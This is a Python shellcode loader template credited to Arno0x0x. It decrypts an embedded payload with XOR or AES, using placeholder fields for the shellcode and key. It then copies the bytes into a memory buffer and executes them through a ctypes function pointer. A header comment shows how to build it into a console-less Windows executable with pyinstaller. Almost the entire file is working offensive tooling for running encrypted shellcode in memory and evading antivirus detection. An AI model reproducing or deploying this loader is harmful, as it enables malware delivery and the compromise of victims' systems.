#!/usr/bin/python
# -*- coding: utf8 -*-
# Author: Arno0x0x, Twitter: @Arno0x0x
#
# You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py
from Crypto.Cipher import AES
from ctypes import *
import base64

#======================================================================================================
#											CRYPTO FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# data as a bytearray
# key as a string
def xor(data, key):
	l = len(key)
	keyAsInt = map(ord, key)
	return bytes(bytearray((
	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
	)))

#------------------------------------------------------------------------
def unpad(s):
	"""PKCS7 padding removal"""
	return s[:-ord(s[len(s)-1:])]

#------------------------------------------------------------------------
def aesDecrypt(cipherText, key):
	"""Decrypt data with the provided key"""

	# Initialization Vector is in the first 16 bytes
	iv = cipherText[:AES.block_size]

	cipher = AES.new(key, AES.MODE_CBC, iv)
	return unpad(cipher.decrypt(cipherText[AES.block_size:]))

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':

	encryptedShellcode = ("${shellcode}")
	key = "${key}"
	cipherType = "${cipherType}"

	# Decrypt the shellcode
	if cipherType == 'xor':
		shellcode = xor(bytearray(encryptedShellcode), key)
	elif cipherType == 'aes':
		key = base64.b64decode(key)
		shellcode = aesDecrypt(encryptedShellcode, key)
	else:
		print "[ERROR] Unknown cipher type"

	# Copy the shellcode to memory and invoke it
	memory_with_shell = create_string_buffer(shellcode, len(shellcode))
	shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))
	shell()
